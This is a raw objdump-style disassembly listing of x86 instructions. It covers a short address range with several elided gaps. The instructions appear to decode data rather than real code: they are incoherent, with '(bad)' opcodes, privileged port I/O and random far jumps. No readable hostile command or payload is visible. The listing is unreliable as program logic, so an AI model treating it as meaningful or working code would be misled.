  41b365:	stos   DWORD PTR es:[edi],eax
  41b366:	push   0xb529e45b
  41b36b:	pop    edi
  41b36c:	lock aad 0xdc
  41b36f:	mov    ah,0x8f
  41b371:	iret   
  41b372:	out    0x89,eax
  41b374:	pop    esp
  41b375:	aas    
  41b376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b377:	daa    
  41b378:	enter  0x30ec,0xe4
  41b37c:	mov    al,ds:0x4e1f9799
  41b381:	fist   DWORD PTR [edx+0x51f31a17]
  41b387:	sub    BYTE PTR [esp+ecx*8+0x3d],ch
  41b38b:	or     al,0x5a
  41b38d:	dec    edi
  41b38e:	or     eax,0x7706c999
  41b393:	pop    edi
  41b394:	or     bh,bh
  41b396:	jns    0x41b31f
  41b398:	cdq    
  41b399:	xor    dl,0xef
  41b39c:	jmp    FWORD PTR [ebx+ebx*4+0x66]
  41b3a0:	in     al,dx
  41b3a1:	xor    DWORD PTR [ecx+eax*8],eax
  41b3a4:	sub    eax,0xc189f6b1
  41b3a9:	jp     0x41b3f6
  41b3ab:	mov    bl,dl
  41b3ad:	cmp    bl,al
  41b3af:	add    al,0x9a
  41b3b1:	jae    0x41b3d7
  41b3b3:	dec    edi
  41b3b4:	nop
  41b3b5:	push   ebp
  41b3b6:	popa   
  41b3b7:	sub    eax,0xf4fba3be
  41b3bc:	inc    ebp
  41b3bd:	lods   eax,DWORD PTR ds:[esi]
  41b3be:	and    DWORD PTR [eax+0xff41],edi
	...
  41b434:	mov    edi,0xff0fcf82
  41b439:	dec    edi
  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	jns    0x41b408
  41b442:	adc    dl,BYTE PTR [ebx]
  41b444:	in     al,0x26
  41b446:	add    DWORD PTR [eax],eax
  41b448:	test   BYTE PTR [eax],0x0
  41b44b:	add    BYTE PTR [edx],cl
  41b44d:	pop    eax
  41b44e:	xchg   ebp,edx
  41b450:	std    
  41b451:	mov    ah,0x6a
  41b453:	aad    0xd5
  41b455:	loopne 0x41b49e
  41b457:	sub    al,0x3b
  41b459:	sbb    esi,DWORD PTR [edi-0x38b3ea02]
  41b45f:	arpl   WORD PTR [eax-0x2d19b2bf],sp
  41b465:	call   0xe607:0x31420c30
  41b46c:	push   cs
  41b46d:	popf   
  41b46e:	mov    bl,0x1e
  41b470:	clc    
  41b471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b472:	sub    bl,ah
  41b474:	xchg   esp,eax
  41b475:	(bad)  
  41b478:	xchg   DWORD PTR [edx+0x6b],ebp
  41b47b:	leave  
  41b47c:	shr    ebp,1
  41b47e:	fwait
  41b47f:	pop    ebx
  41b480:	inc    esi
  41b481:	sbb    bh,BYTE PTR [ecx]
  41b483:	dec    esi
  41b484:	and    DWORD PTR [edx],edi
  41b486:	inc    ebp
  41b487:	sub    edi,DWORD PTR [edi-0x77]
  41b48a:	xchg   esi,eax
  41b48b:	ret    0x80a
  41b48e:	pop    ebp
  41b48f:	stos   BYTE PTR es:[edi],al
  41b490:	cmp    eax,0x94e206b3
  41b495:	test   eax,0xe41c9b79
  41b49a:	bound  ecx,QWORD PTR [ebx]
  41b49c:	and    eax,0xd3d30885
  41b4a1:	or     eax,0xff99fe50
  41b4a6:	(bad)  
  41b4a7:	adc    ebx,DWORD PTR [edx+0x73aff981]
  41b4ad:	xchg   esp,eax
  41b4ae:	(bad)  
  41b4af:	cmp    dh,BYTE PTR [ebx-0x14]
  41b4b2:	mov    dh,al
  41b4b4:	rcl    BYTE PTR [ebx-0x15d2a076],1
  41b4ba:	xchg   esp,eax
  41b4bb:	xor    DWORD PTR [ecx+ecx*1],edi
  41b4be:	dec    ecx
  41b4bf:	rcl    DWORD PTR [edi+0x733a4640],1
  41b4c5:	inc    esp
  41b4c6:	sbb    al,0xc2
  41b4c8:	jecxz  0x41b4f6
  41b4ca:	stos   BYTE PTR es:[edi],al
  41b4cb:	xor    eax,DWORD PTR [eax-0x7d]
  41b4ce:	bound  edi,QWORD PTR [edx+esi*8+0x5d]
  41b4d2:	cmp    esp,ecx
  41b4d4:	call   0xc7b17827
  41b4d9:	daa    
  41b4da:	cmc    
  41b4db:	xchg   edx,eax
  41b4dc:	and    al,0xf8
  41b4de:	jl     0x41b499
  41b4e0:	mov    BYTE PTR [edx+0x3f38680f],bl
  41b4e6:	fidivr WORD PTR [eax]
  41b4e8:	inc    ebp
  41b4e9:	or     BYTE PTR [edx+0x1a564780],ah
  41b4ef:	enter  0x80ad,0x6a
  41b4f3:	and    al,0x2c
  41b4f5:	aaa    
  41b4f6:	jecxz  0x41b4de
  41b4f8:	mov    ecx,0xc1dded55
  41b4fd:	hlt    
  41b4fe:	test   BYTE PTR [edi+0x3a07dc2f],0x41
  41b505:	sbb    al,0xd2
  41b507:	jbe    0x41b535
  41b509:	(bad)  
  41b50b:	xor    edx,DWORD PTR [ecx+0x68fa8352]
  41b511:	jmp    0x41b53a
  41b513:	aam    0x5e
  41b515:	jne    0x41b551
  41b517:	and    edi,DWORD PTR [esi]
  41b519:	xlat   BYTE PTR ds:[ebx]
  41b51a:	call   0xbb5d3bd2
  41b51f:	ja     0x41b537
  41b521:	icebp  
  41b522:	pop    ecx
  41b523:	imul   ebx,ebx,0xbdac87b3
  41b529:	dec    edi
  41b52a:	mov    edi,0xf3e6a117
  41b52f:	mov    ebx,0x375e8d3d
  41b534:	punpcklwd mm1,mm1
  41b537:	les    esp,FWORD PTR [edx]
  41b539:	sbb    BYTE PTR [esi-0x56],cl
  41b53c:	sahf   
  41b53d:	xchg   ecx,eax
  41b53e:	cmp    BYTE PTR [eax+0x6f],ah
  41b541:	pop    esi
	...
  41b5b2:	add    BYTE PTR [eax],al
  41b5b4:	pop    esp
  41b5b5:	sub    al,BYTE PTR [ecx]
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0x1e
  41b5c1:	push   ebp
  41b5c2:	push   0x127dab9
  41b5c7:	add    dh,dh
  41b5c9:	add    BYTE PTR [eax],al
  41b5cb:	add    BYTE PTR [eax],ah
  41b5cd:	imul   edi,DWORD PTR ds:0x250d04d2,0x9f00315f
  41b5d7:	xor    cl,BYTE PTR [edi+0x43892c14]
  41b5dd:	mov    ecx,DWORD PTR [eax]
  41b5df:	gs jg  0x41b591
  41b5e2:	(bad)  
  41b5e3:	push   cs
  41b5e4:	sbb    ebx,DWORD PTR ds:0x35f2c5e9
  41b5ea:	aad    0x2c
  41b5ec:	inc    eax
  41b5ed:	mov    ds:0xefd927da,eax
  41b5f2:	jns    0x41b5a4
  41b5f4:	scas   al,BYTE PTR es:[edi]
  41b5f5:	fisub  DWORD PTR [ebx+0x27029e72]
  41b5fb:	aaa    
  41b5fc:	or     BYTE PTR [esi+0x49],ch
  41b5ff:	std    
  41b600:	nop
  41b601:	xchg   edi,eax
  41b602:	jp     0x41b607
  41b604:	stos   DWORD PTR es:[edi],eax
  41b605:	(bad)  
  41b606:	test   eax,0x4d8405dc
  41b60b:	ret    
  41b60c:	out    dx,al
  41b60d:	retf   
  41b60e:	push   0x5f
  41b610:	lods   al,BYTE PTR ds:[esi]
  41b611:	jg     0x41b651
  41b613:	add    bl,dh
  41b615:	dec    esi
  41b616:	out    dx,eax
  41b617:	mov    eax,ds:0x20f726f5
  41b61c:	inc    edi
  41b61d:	sub    bh,BYTE PTR [ebp-0x73]
  41b620:	push   eax
  41b621:	out    dx,eax
  41b622:	fild   DWORD PTR [edi]
  41b624:	or     esi,DWORD PTR [edi+0x462a84dd]
  41b62a:	and    dh,bl
  41b62c:	js     0x41b630
  41b62e:	mov    bh,0x7d
  41b630:	mov    cl,0x64
  41b632:	mov    al,ds:0x690d855c
  41b637:	loop   0x41b633
  41b639:	sbb    esp,DWORD PTR [esi]
  41b63b:	fwait
  41b63c:	adc    ecx,edx
  41b63e:	pop    esp
  41b63f:	test   BYTE PTR [esi+0x100ac12b],0x2e
  41b646:	repz sbb ecx,esp
  41b649:	loopne 0x41b6b4
  41b64b:	and    ecx,ebp
  41b64d:	inc    ebp
  41b64e:	leave  
  41b64f:	bound  ecx,QWORD PTR [eax-0x14]
  41b652:	mov    al,0xd8
  41b654:	mov    esp,0xabc0f203
  41b659:	mov    edi,0x4b442f8b
  41b65e:	ficom  DWORD PTR [edi-0x73]
  41b661:	std    
  41b662:	push   es
  41b663:	ror    DWORD PTR [edx],cl
  41b665:	iret   
  41b666:	push   edx
  41b667:	sbb    eax,ecx
  41b669:	sub    DWORD PTR [ebp+0x26],edi
  41b66c:	ret    0x7673
  41b66f:	push   ds
  41b670:	cmp    edi,DWORD PTR [eax-0x21]
  41b673:	repz popa 
  41b675:	push   eax
  41b676:	stos   BYTE PTR es:[edi],al
  41b677:	jbe    0x41b634
  41b679:	cwde   
  41b67a:	mov    ds:0xc4f5d64d,eax
  41b67f:	inc    ebx
  41b680:	fwait
  41b681:	sub    al,0xfe
  41b683:	cli    
  41b684:	xchg   ebx,eax
  41b685:	sar    DWORD PTR [edi+esi*2],cl
  41b688:	pop    ebx
  41b689:	mov    ah,0x1d
  41b68b:	mov    eax,ds:0xe02dced
  41b690:	jb     0x41b6a9
  41b692:	mov    DWORD PTR [ebp-0x15],esp
  41b695:	bound  edx,QWORD PTR [ebx]
  41b697:	test   DWORD PTR [ecx+0x6543dd7],ebx
  41b69d:	outs   dx,BYTE PTR ds:[esi]
  41b69e:	out    dx,al
  41b69f:	dec    ebx
  41b6a0:	jp     0x41b6d6
  41b6a2:	inc    ecx
  41b6a3:	hlt    
  41b6a4:	sbb    al,0x6a
  41b6a6:	adc    DWORD PTR [edx+0x5f],ebp
  41b6a9:	xor    al,0x2b
  41b6ab:	mov    WORD PTR [edi-0x1ae62a91],cs
  41b6b1:	aas    
  41b6b2:	mov    BYTE PTR [ecx+0x7b],dl
  41b6b5:	into   
  41b6b6:	jge    0x41b6e2
  41b6b8:	es xchg edi,eax
  41b6ba:	mov    al,ds:0x25c38b05
  41b6bf:	xor    ch,bh
  41b6c1:	dec    edx
	...
  41b732:	add    BYTE PTR [eax],al
  41b734:	repz xchg edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    BYTE PTR [edx-0x2f62b048],ah
  41b745:	sub    BYTE PTR [ecx],al
  41b747:	add    dh,dh
  41b749:	add    BYTE PTR [eax],al
  41b74b:	add    BYTE PTR [edx+edi*4+0x602c69a0],al
  41b752:	clc    
  41b753:	repz fldcw WORD PTR [ebx-0x2e]
  41b757:	sub    bh,ah
  41b759:	aaa    
  41b75a:	push   ecx
  41b75b:	pop    edx
  41b75c:	jne    0x41b734
  41b75e:	xchg   BYTE PTR [edi+0x16],dl
  41b761:	push   ebx
  41b762:	mov    al,BYTE PTR [ebx+0x62]
  41b765:	pop    edx
  41b766:	jae    0x41b7c9
  41b768:	call   0x1ff92df9
  41b76d:	icebp  
  41b76e:	or     dl,cl
  41b770:	jmp    0x41b776
  41b772:	jl     0x41b6fc
  41b774:	mov    ds:0xa2770121,eax
  41b779:	push   esi
  41b77a:	std    
  41b77b:	enter  0x48b3,0x6a
  41b77f:	inc    edx
  41b780:	enter  0x94c4,0xae
  41b784:	pop    eax
  41b785:	fst    st(5)
  41b787:	pop    ecx
  41b788:	sbb    eax,DWORD PTR [edx+0x16]
  41b78b:	cmp    DWORD PTR [ebx+0x34],0x37
  41b78f:	daa    
  41b790:	xchg   BYTE PTR [ecx],dl
  41b792:	fdivr  st,st(4)
  41b794:	push   ss
  41b795:	inc    ecx
  41b796:	sbb    al,0x40
  41b798:	(bad)  
  41b799:	lds    edi,FWORD PTR [ebx]
  41b79b:	dec    edx
  41b79c:	mov    dh,0xa1
  41b79e:	aaa    
  41b79f:	add    eax,0x7aeb2330
  41b7a4:	jbe    0x41b733
  41b7a6:	adc    ebx,DWORD PTR [edx+ebx*1+0x42886fd7]
  41b7ad:	loop   0x41b82e
  41b7af:	mov    esp,DWORD PTR [ebx+edi*4+0x69087c71]
  41b7b6:	dec    esi
  41b7b7:	stc    
  41b7b8:	retf   0x674d
  41b7bb:	jecxz  0x41b764
  41b7bd:	and    eax,0xd7b3ac5
  41b7c2:	jbe    0x41b7c6
  41b7c4:	push   ecx
  41b7c5:	xor    BYTE PTR [eax+0x18],0xad
  41b7c9:	repz retf 
  41b7cb:	inc    edi
  41b7cc:	mov    ds:0x5ec85c66,al
  41b7d1:	adc    al,0x2
  41b7d3:	in     al,dx
  41b7d4:	aam    0x93
  41b7d6:	pop    edx
  41b7d7:	push   esp
  41b7d8:	data16 mov ds:0xa3b86deb,al
  41b7de:	or     BYTE PTR [edx-0x5],cl
  41b7e1:	test   DWORD PTR [ebp-0x1a],ecx
  41b7e4:	sub    al,0x3f
  41b7e6:	add    BYTE PTR [esi],bl
  41b7e8:	jecxz  0x41b83c
  41b7ea:	retf   0x93c6
  41b7ed:	pop    ebp
  41b7ee:	add    edi,eax
  41b7f0:	sar    DWORD PTR [ebx+0xb],0x84
  41b7f4:	lods   al,BYTE PTR ds:[esi]
  41b7f5:	xchg   esi,eax
  41b7f6:	inc    ecx
  41b7f7:	sub    eax,0x6c64c44c
  41b7fc:	xchg   ebp,eax
  41b7fd:	inc    eax
  41b7fe:	xor    BYTE PTR [edx+0x7f],dh
  41b801:	jmp    0x41b852
  41b803:	mov    ebp,0x447c5bef
  41b808:	sbb    BYTE PTR [eax+ebx*1],dh
  41b80b:	cmp    BYTE PTR [edx+ecx*4-0x1de60880],bl
  41b812:	(bad)  
  41b813:	fadd   QWORD PTR [edx+0x7b]
  41b816:	dec    ecx
  41b817:	cwde   
  41b818:	inc    ecx
  41b819:	mov    eax,0x200ec0f
  41b81e:	int3   
  41b81f:	xchg   esp,eax
  41b820:	mov    dh,0x22
  41b822:	inc    edx
  41b823:	push   edi
  41b824:	retf   0x3632
  41b827:	push   0xda530d02
  41b82c:	in     al,0x38
  41b82e:	lock pop eax
  41b830:	lock push cs
  41b832:	int    0xf8
  41b834:	mov    dl,0xe4
  41b836:	sbb    dh,BYTE PTR [esi-0x153e668d]
  41b83c:	pop    ss
  41b83d:	cmp    DWORD PTR [edi+0x15],0x5
  41b841:	inc    edi
	...
  41b8b2:	add    BYTE PTR [eax],al
  41b8b4:	xor    eax,0xcf4a867e
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	ret    
  41b8c1:	shl    DWORD PTR [esi-0x28],0xc6
  41b8c5:	sub    DWORD PTR [ecx],eax
  41b8c7:	add    dh,dh
  41b8c9:	add    BYTE PTR [eax],al
  41b8cb:	add    BYTE PTR [ecx],ah
  41b8cd:	dec    edx
  41b8ce:	and    DWORD PTR [ebx],edx
  41b8d0:	cmp    eax,0x41d4b870
  41b8d5:	jae    0x41b923
  41b8d7:	push   ds
  41b8d8:	jmp    0x41b8dc
  41b8da:	lods   eax,DWORD PTR ds:[esi]
  41b8db:	imul   ebp,ecx,0xffffff96
  41b8de:	gs xchg ebx,eax
  41b8e0:	sbb    al,0x41
  41b8e2:	lahf   
  41b8e3:	add    BYTE PTR [esi+0x6a],dh
  41b8e6:	imul   edx,DWORD PTR [ebp+0x18],0x494c3fb
  41b8ed:	push   0x6f7877ce
  41b8f2:	cmp    al,BYTE PTR [edx+edi*2]
  41b8f5:	and    cl,BYTE PTR [eax]
  41b8f7:	cmp    DWORD PTR [ebx+0x7bf1445b],0x79
  41b8fe:	dec    edi
  41b8ff:	test   DWORD PTR [ebx-0x194471b],edx
  41b905:	and    ah,ah
  41b907:	jae    0x41b896
  41b909:	xchg   ebx,eax
  41b90a:	xor    BYTE PTR [edi+0x74495b62],ch
  41b910:	shl    DWORD PTR [esi+eax*2],1
  41b913:	dec    ebp
  41b914:	xor    eax,0x98efbd91
  41b919:	ins    BYTE PTR es:[edi],dx
  41b91a:	pop    ecx
  41b91b:	or     eax,0xc6c3ee56
  41b920:	jle    0x41b988
  41b922:	or     DWORD PTR [ecx-0x4cd3c9dd],edx
  41b928:	loope  0x41b8b9
  41b92a:	mov    dl,0xf6
  41b92c:	std    
  41b92d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b92e:	pop    ebx
  41b92f:	mov    edi,0x82aba3fd
  41b934:	(bad)  
  41b935:	repnz adc DWORD PTR [edx],eax
  41b938:	jecxz  0x41b8eb
  41b93a:	daa    
  41b93b:	dec    esp
  41b93c:	fistp  DWORD PTR [edi-0xc123224]
  41b942:	sti    
  41b943:	and    BYTE PTR [edx],dl
  41b945:	push   edi
  41b946:	cmp    BYTE PTR [ebp-0x3f],ah
  41b949:	mov    eax,ds:0xe216a319
  41b94e:	sbb    eax,0xf5a48dd1
  41b953:	out    0x49,eax
  41b955:	out    0x89,al
  41b957:	jo     0x41b973
  41b959:	sub    BYTE PTR [ecx-0x6f],dl
  41b95c:	xlat   BYTE PTR ds:[ebx]
  41b95d:	mov    ds:0x2face804,eax
  41b962:	ds cdq 
  41b964:	stc    
  41b965:	adc    DWORD PTR [edx+ecx*8-0x1d42c510],eax
  41b96c:	fsubr  st,st(7)
  41b96e:	shl    BYTE PTR cs:[ecx-0x24],0x0
  41b973:	push   eax
  41b974:	jl     0x41b94e
  41b976:	pop    DWORD PTR [ebx]
  41b978:	mov    ds:0xe744462c,eax
  41b97d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b97e:	test   eax,esp
  41b980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b981:	jo     0x41b924
  41b983:	mov    ss,WORD PTR [eax-0x4ffccec6]
  41b989:	mov    cs,WORD PTR [esp+eax*1+0x58ecc755]
  41b990:	fstp   st(7)
  41b992:	and    al,0x9d
  41b994:	lea    ebx,es:[edi-0x9]
  41b998:	dec    ecx
  41b999:	ret    0x30bd
  41b99c:	cmp    esp,DWORD PTR [ecx-0xe]
  41b99f:	jmp    0x41b9bc
  41b9a1:	cmp    bh,BYTE PTR [ecx-0x32d78e38]
  41b9a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9a8:	jae    0x41ba20
  41b9aa:	aad    0xe9
  41b9ac:	adc    eax,0x35b0d7a5
  41b9b1:	mov    ds:0x63155674,al
  41b9b6:	test   bh,bh
  41b9b8:	mov    edi,0x588f025a
  41b9bd:	jg     0x41ba3a
  41b9bf:	pop    eax
  41b9c0:	adc    al,0x89
	...
  41ba32:	add    BYTE PTR [eax],al
  41ba34:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	inc    eax
  41ba41:	add    BYTE PTR [edi],0xb4
  41ba44:	mov    esp,0xf600012a
  41ba49:	add    BYTE PTR [eax],al
  41ba4b:	add    BYTE PTR [esi+0x55],ah
  41ba4e:	sub    eax,0x4998f662
  41ba53:	mov    edi,0x936a3479
  41ba58:	test   BYTE PTR [eax-0x22d0f8ff],0x1d
  41ba5f:	(bad)  
  41ba60:	icebp  
  41ba61:	clc    
  41ba62:	fisub  DWORD PTR [edi]
  41ba64:	dec    ebp
  41ba65:	push   ebp
  41ba66:	retf   
  41ba67:	outs   dx,BYTE PTR ds:[esi]
  41ba68:	les    esi,FWORD PTR [ecx-0x23]
  41ba6b:	into   
  41ba6c:	xchg   edi,eax
  41ba6d:	pop    eax
  41ba6e:	push   DWORD PTR [ebx+esi*8+0xf]
  41ba72:	mov    esi,0xf2fb1632
  41ba77:	arpl   WORD PTR [edi+0x75],bp
  41ba7a:	jne    0x41bab9
  41ba7c:	pusha  
  41ba7d:	dec    edi
  41ba7e:	mov    esi,0x46910cb7
  41ba83:	mov    ebp,0x82a3d4d2
  41ba88:	inc    ebx
  41ba89:	push   edi
  41ba8a:	imul   ebx,ebp,0x3460d13f
  41ba90:	dec    ecx
  41ba91:	jns    0x41ba96
  41ba93:	mov    ds:0xa21beb95,eax
  41ba98:	fcmovnb st,st(5)
  41ba9a:	popa   
  41ba9b:	lods   eax,DWORD PTR ds:[esi]
  41ba9c:	loope  0x41ba59
  41ba9e:	out    0x1,al
  41baa0:	xchg   edi,eax
  41baa1:	xchg   DWORD PTR [edi+0x21],esp
  41baa4:	dec    esi
  41baa5:	data16 add ah,BYTE PTR [esi-0x6b]
  41baa9:	jo     0x41ba94
  41baab:	outs   dx,DWORD PTR ds:[esi]
  41baac:	hlt    
  41baad:	mov    DWORD PTR [ebp+0x56ee3616],eax
  41bab3:	dec    esp
  41bab4:	loope  0x41ba8d
  41bab6:	cwde   
  41bab7:	sub    BYTE PTR [ebp+0x406eacb0],bl
  41babd:	fbld   TBYTE PTR [eax]
  41babf:	mov    ebx,0xa43d921d
  41bac4:	inc    ebp
  41bac5:	cmp    esp,DWORD PTR [ecx]
  41bac7:	xchg   BYTE PTR [edi-0x6895195b],bh
  41bacd:	fbld   TBYTE PTR [eax]
  41bacf:	mov    edi,0xa9cce259
  41bad4:	cli    
  41bad5:	or     eax,DWORD PTR [eax-0x4682a31c]
  41badb:	add    bh,BYTE PTR [edx]
  41badd:	iret   
  41bade:	mov    cs,WORD PTR [eax-0x13]
  41bae1:	xchg   esi,eax
  41bae2:	outs   dx,BYTE PTR ds:[esi]
  41bae3:	in     eax,0x43
  41bae5:	push   ebx
  41bae6:	mov    dh,0xc0
  41bae8:	arpl   WORD PTR [edx-0x535d77b2],dx
  41baee:	xchg   ebx,eax
  41baef:	loope  0x41bb23
  41baf1:	test   eax,0x98faca46
  41baf6:	ins    BYTE PTR es:[edi],dx
  41baf7:	js     0x41bb44
  41baf9:	adc    BYTE PTR [ecx],al
  41bafb:	shl    esp,1
  41bafd:	test   DWORD PTR [eax+eax*8],0xb5f7c7d8
  41bb04:	xchg   ecx,eax
  41bb05:	xchg   edi,eax
  41bb06:	xchg   DWORD PTR es:[edi],esi
  41bb09:	sbb    al,0xc2
  41bb0b:	push   cs
  41bb0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb0d:	xlat   BYTE PTR ds:[ebx]
  41bb0e:	xchg   ebx,eax
  41bb0f:	sub    eax,0x1687d40
  41bb14:	jp     0x41bb10
  41bb16:	add    edx,eax
  41bb18:	cmp    eax,0x89949497
  41bb1d:	ror    ch,cl
  41bb1f:	popa   
  41bb20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb21:	push   esp
  41bb22:	push   ss
  41bb23:	(bad)  
  41bb25:	xchg   DWORD PTR [esi+0x4],edi
  41bb28:	dec    esi
  41bb29:	or     cl,al
  41bb2b:	retf   
  41bb2c:	fadd   QWORD PTR [ecx]
  41bb2e:	jnp    0x41bba1
  41bb30:	js     0x41bb68
  41bb32:	pop    ds
  41bb33:	addr16 mov ebp,0x2a72c09e
  41bb39:	mov    ah,0xd0
  41bb3b:	push   0x58
  41bb3d:	out    dx,al
  41bb3e:	push   cs
  41bb3f:	adc    al,bl
  41bb41:	test   BYTE PTR [eax],al
	...
  41bbb3:	add    BYTE PTR [edx+0x49],ch
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	in     al,0xc
  41bbc2:	stc    
  41bbc3:	mov    edx,0x12bb2
  41bbc8:	test   BYTE PTR [eax],0x0
  41bbcb:	add    dh,ch
  41bbcd:	test   BYTE PTR [eax+0x1bbde7e0],bh
  41bbd3:	aam    0x78
  41bbd5:	sub    DWORD PTR [ecx+0x55],esp
  41bbd8:	test   BYTE PTR [edi+0x40],cl
  41bbdb:	mov    ds:0xf4b42705,al
  41bbe0:	je     0x41bbcc
  41bbe2:	imul   ecx,DWORD PTR [eax-0x9],0xa9bfe01f
  41bbe9:	shr    DWORD PTR [ebp+0x16],1
  41bbec:	adc    BYTE PTR ds:0xb065b8fa,ah
  41bbf2:	sbb    al,0xa1
  41bbf4:	fcom   DWORD PTR [edi+0x689c4b1]
  41bbfa:	xor    al,0xfb
  41bbfc:	mov    dl,0xda
  41bbfe:	fcom   QWORD PTR [eax-0x2431be46]
  41bc04:	mov    edx,0xfb629fc9
  41bc09:	imul   edi,DWORD PTR [esi-0x5e],0xffffffb2
  41bc0d:	pop    ebp
  41bc0e:	repz mov ebp,0x47e7db75
  41bc14:	jnp    0x41bc42
  41bc16:	mov    ds:0xdc401eaf,al
  41bc1b:	push   ecx
  41bc1c:	pop    ss
  41bc1d:	outs   dx,BYTE PTR ds:[esi]
  41bc1e:	inc    esi
  41bc1f:	and    eax,0x8b3fbc3f
  41bc24:	pop    edi
  41bc25:	not    BYTE PTR [edx+0x4ffdb057]
  41bc2b:	xor    bl,cl
  41bc2d:	push   esp
  41bc2e:	data16 dec BYTE PTR [esi-0x59da7073]
  41bc35:	in     al,0xfe
  41bc37:	push   esp
  41bc38:	jb     0x41bc7b
  41bc3a:	xchg   edx,eax
  41bc3b:	jmp    0x41bc00
  41bc3d:	retf   
  41bc3e:	outs   dx,BYTE PTR ds:[esi]
  41bc3f:	scas   eax,DWORD PTR es:[edi]
  41bc40:	cwde   
  41bc41:	cmp    BYTE PTR [edx+edi*8+0x7d],0x94
  41bc46:	cmp    al,0x73
  41bc48:	or     bh,dl
  41bc4a:	xlat   BYTE PTR ds:[ebx]
  41bc4b:	fstp   DWORD PTR [edi+0x5a]
  41bc4e:	sar    BYTE PTR [ebp+0x31],0x6f
  41bc52:	cmp    esi,eax
  41bc54:	inc    eax
  41bc55:	cwde   
  41bc56:	enter  0xebda,0x34
  41bc5a:	mov    ebp,0x31a5872d
  41bc5f:	fld    TBYTE PTR [edx+eax*2]
  41bc62:	jae    0x41bc5d
  41bc64:	out    0xb2,al
  41bc66:	gs push ebx
  41bc68:	adc    ch,BYTE PTR [esi]
  41bc6a:	mov    dl,0xc8
  41bc6c:	adc    eax,0x6a521ebb
  41bc71:	xor    bl,BYTE PTR [ecx+0x1483eec0]
  41bc77:	or     bh,BYTE PTR [ebx+0x4e]
  41bc7a:	fdiv   st,st(7)
  41bc7c:	mov    BYTE PTR [esi+eax*2],dl
  41bc7f:	and    DWORD PTR [ecx],esi
  41bc81:	ret    0x7670
  41bc84:	xchg   DWORD PTR [esp+edi*4-0x2b],eax
  41bc88:	lods   al,BYTE PTR ds:[esi]
  41bc89:	retf   0xb95c
  41bc8c:	xchg   edx,eax
  41bc8d:	xchg   edx,eax
  41bc8e:	aam    0x63
  41bc90:	out    dx,eax
  41bc91:	in     al,dx
  41bc92:	iret   
  41bc93:	xlat   BYTE PTR ds:[ebx]
  41bc94:	sti    
  41bc95:	add    ch,ah
  41bc97:	icebp  
  41bc98:	and    eax,0x50acce1b
  41bc9d:	aam    0xc0
  41bc9f:	imul   BYTE PTR [ecx]
  41bca1:	imul   ebp,eax,0x44
  41bca4:	mov    ds:0x44f852c7,eax
  41bca9:	add    dh,ch
  41bcab:	call   0x2c4d:0x7744cca0
  41bcb2:	fist   WORD PTR [edi]
  41bcb4:	arpl   WORD PTR [edx],dx
  41bcb6:	outs   dx,BYTE PTR ds:[esi]
  41bcb7:	jmp    0x41bcd8
  41bcb9:	xor    BYTE PTR [edi],bh
  41bcbb:	mov    ebp,gs
  41bcbd:	sti    
  41bcbe:	lahf   
  41bcbf:	getsec 
  41bcc1:	jnp    0x41bcc3
	...
  41bd33:	add    BYTE PTR [ebp-0x8],dl
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0x85bf1c9a
  41bd41:	outs   dx,DWORD PTR ds:[esi]
  41bd42:	pop    esi
  41bd43:	ret    0x2ca8
  41bd46:	add    DWORD PTR [eax],eax
  41bd48:	test   BYTE PTR [eax],0x0
  41bd4b:	add    cl,ah
  41bd4d:	jp     0x6d424e07
  41bd53:	or     al,0xb0
  41bd55:	test   BYTE PTR [edx-0x52],dh
  41bd58:	xor    BYTE PTR [ebx-0x681778f7],al
  41bd5e:	push   edx
  41bd5f:	lea    ecx,[edi-0x3f]
  41bd62:	jae    0x41bd58
  41bd64:	dec    esi
  41bd65:	mov    ebp,0x1f4bc4dc
  41bd6a:	sti    
  41bd6b:	(bad)  
  41bd6d:	cdq    
  41bd6e:	add    dl,BYTE PTR [esi]
  41bd70:	mov    eax,ds:0x7dda7f94
  41bd75:	inc    esp
  41bd76:	inc    esi
  41bd77:	inc    ebp
  41bd78:	leave  
  41bd79:	in     al,dx
  41bd7a:	repz mov esp,DWORD PTR [edi+0x15]
  41bd7e:	(bad)  
  41bd7f:	mov    ds:0x9c892a00,eax
  41bd84:	push   ebx
  41bd85:	lods   eax,DWORD PTR ds:[esi]
  41bd86:	out    0x81,al
  41bd88:	sub    eax,0xdddf60c3
  41bd8d:	xchg   DWORD PTR [ecx-0x44b3ca1a],eax
  41bd93:	ss and ebp,esi
  41bd96:	or     DWORD PTR [ecx-0x2e7683b4],ecx
  41bd9c:	inc    ebx
  41bd9d:	and    ebp,esp
  41bd9f:	rep stos DWORD PTR es:[edi],eax
  41bda1:	and    edx,esi
  41bda3:	int3   
  41bda4:	pop    ds
  41bda5:	nop
  41bda6:	fisttp DWORD PTR [eax+ebp*8-0x1a]
  41bdaa:	bound  edx,QWORD PTR [eax+0x5abbd374]
  41bdb0:	in     al,0x4b
  41bdb2:	je     0x41be18
  41bdb4:	dec    ebx
  41bdb5:	cmp    BYTE PTR [eax],cl
  41bdb7:	aas    
  41bdb8:	stc    
  41bdb9:	jno    0x41bdab
